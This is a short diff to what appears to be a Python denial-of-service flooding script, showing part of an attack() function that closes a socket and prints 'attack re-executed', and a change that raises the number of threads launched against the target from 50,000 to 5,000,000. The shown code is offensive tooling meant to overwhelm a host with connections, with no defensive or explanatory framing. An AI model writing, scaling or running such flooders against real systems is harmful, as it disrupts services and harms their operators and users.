@@ -23,7 +23,7 @@ def attack():
         print("attack re-executed:", attack_num )
         s.close()
         
-for i in range(50000):
+for i in range(5000000):
     thread = threading.Thread(target=attack)
     thread.start()
     if(thread.is_alive):
